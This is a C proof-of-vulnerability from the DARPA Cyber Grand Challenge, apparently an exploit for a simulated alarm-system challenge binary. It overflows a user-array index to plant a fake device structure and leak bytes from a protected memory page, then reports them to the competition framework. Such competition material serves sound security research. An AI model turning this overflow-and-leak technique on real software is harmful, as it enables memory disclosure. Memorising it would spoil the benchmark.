/*

Author: Joe Rogers <joe@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/
#include "libcgc.h"

#define EBP (5)
#define FRAMEWORK (3)

unsigned int cgc_ReadBytes(int fd, char *buf, unsigned int len) {
	unsigned int total_bytes = 0;
	cgc_size_t rx_bytes;
	unsigned char c;

	while (total_bytes < len) {
		if (cgc_receive(fd, &c, 1, &rx_bytes) != 0) {
			return(0);
		}
		if (rx_bytes == 0) {
			return(0);
		}
		buf[total_bytes++] = c;
	}

	return(total_bytes);
}

unsigned int cgc_SendBytes(int fd, char *buf, unsigned int len) {
	cgc_size_t tx_bytes;
	unsigned int total_bytes = 0;

	while (total_bytes < len) {
		if (cgc_transmit(fd, buf+total_bytes, 1, &tx_bytes) != 0) {
			return(0);
		}
		if (tx_bytes != 1) {
			return(0);
		}
		total_bytes++;
	}

	return(total_bytes);
}

void cgc_NegotiateType2Pov(unsigned int *type2_addr, unsigned int *type2_size, unsigned int *type2_length) {
	unsigned int PovType = 2;

	// Request Type 2 negotitation
	if (cgc_SendBytes(3, (char *)&PovType, 4) != 4) {
		cgc__terminate(-1);
	}

	// get the 4-byte value for type2_addr
	if (cgc_ReadBytes(3, (char *)type2_addr, 4) != 4) {
		cgc__terminate(-1);
	}
	// get the 4-byte value for type2_size
	if (cgc_ReadBytes(3, (char *)type2_size, 4) != 4) {
		cgc__terminate(-1);
	}
	// get the 4-byte value for type2_length
	if (cgc_ReadBytes(3, (char *)type2_length, 4) != 4) {
		cgc__terminate(-1);
	}

	return;
}

int main(int cgc_argc, char *cgc_argv[]) {
	unsigned int type2_addr;
	unsigned int type2_size;
	unsigned int type2_length;
	char Req[1024];
	unsigned int val = 0x01010101;
	unsigned int i;

	// negotiate a Type2 POV with the Competition Framework
	cgc_NegotiateType2Pov(&type2_addr, &type2_size, &type2_length);

	// Create max users
	for (i = 0; i < 128; i++) {
		cgc_SendBytes(STDOUT, "\x00", 1); // CMD_ADD_USER
		cgc_SendBytes(STDOUT, (char *)&val, 4); // username
		cgc_SendBytes(STDOUT, "AAAAAAAAAAAAAAAAAAAAAAAAAAA\x00", 28); // rest of username
		cgc_SendBytes(STDOUT, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00", 32); // first name (doesn't matter)
		cgc_SendBytes(STDOUT, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00", 32); // last name (doesn't matter)
		cgc_SendBytes(STDOUT, (char *)&val, 4); // pin
		cgc_SendBytes(STDOUT, "0\x00", 2); // rest of pin
		cgc_SendBytes(STDOUT, (char *)&val, 4); // access code
		cgc_SendBytes(STDOUT, "000000000000000000000000000\x00", 28); // rest of access code
		cgc_ReadBytes(STDIN, Req, 3);
		val++;
	}

	// Create one more user to overflow the array index
	cgc_SendBytes(STDOUT, "\x00", 1); // CMD_ADD_USER
	cgc_SendBytes(STDOUT, "AAAAAA", 6); // get us to the Device structure aligned address
	cgc_SendBytes(STDOUT, "\x01\x00\xff\xff", 4); // Keypad-type device, DeviceId = 0xffff
	cgc_SendBytes(STDOUT, "\x00\xc0\x47\x43", 4); // Keypad authorized codes pointer set to the magic page
	cgc_SendBytes(STDOUT, "AAAAAAAAAAAAAAAAA\x00", 18); // rest of username
	cgc_SendBytes(STDOUT, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00", 32); // first name (doesn't matter)
	cgc_SendBytes(STDOUT, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00", 32); // last name (doesn't matter)
	cgc_SendBytes(STDOUT, (char *)&val, 4); // pin
	cgc_SendBytes(STDOUT, "0\x00", 2); // rest of pin
	cgc_SendBytes(STDOUT, (char *)&val, 4); // access code
	cgc_SendBytes(STDOUT, "000000000000000000000000000\x00", 28); // rest of access code
	cgc_ReadBytes(STDIN, Req, 3);

	// send the List Codes command to dump the magic page
	cgc_SendBytes(STDOUT, "\x08", 1); // CMD_LIST_ALARM_CODES
	cgc_SendBytes(STDOUT, "\xff\xff", 2); // Our fake device entry's ID
	cgc_ReadBytes(STDIN, Req, 1); // cgc_read the number of alarm codes we'll be receiving
	cgc_ReadBytes(STDIN, Req, 4); // cgc_read the first 4 bytes of the first code
	
	// Send the value
	cgc_SendBytes(FRAMEWORK, Req, 4);

}
